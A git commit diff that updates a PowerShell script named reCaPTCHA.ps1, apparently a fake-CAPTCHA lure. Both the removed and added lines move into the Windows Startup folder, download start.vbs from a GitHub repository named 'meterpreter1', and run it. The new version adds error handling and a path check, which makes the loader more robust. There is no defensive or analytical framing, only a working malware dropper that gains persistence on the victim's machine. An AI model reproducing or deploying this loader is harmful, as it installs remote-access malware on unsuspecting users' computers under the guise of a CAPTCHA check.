32ea236679d170c2c613f6a2a2dc7c25e2175665
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-09-21 19:54:17 +0300

    Update reCaPTCHA.ps1

--- reCaPTCHA.ps1
+++ reCaPTCHA.ps1
@@ -1,3 +1,12 @@
-Set-Location -Path "$env:AppData\Microsoft\Windows\Start Menu\Programs\Startup"
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/0x2034/meterpreter1/main/start.vbs" -OutFile "start.vbs"
-Start-Process "start.vbs"
+$startupPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup')
+If (!(Test-Path $startupPath)) {
+    Write-Output "Startup path not found: $startupPath"
+} Else {
+    Set-Location -Path $startupPath
+    try {
+        (New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/0x2034/meterpreter1/main/start.vbs", "start.vbs")
+        Start-Process "start.vbs"
+    } catch {
+        Write-Output "Failed to download or start the file. Error: $_"
+    }
+}
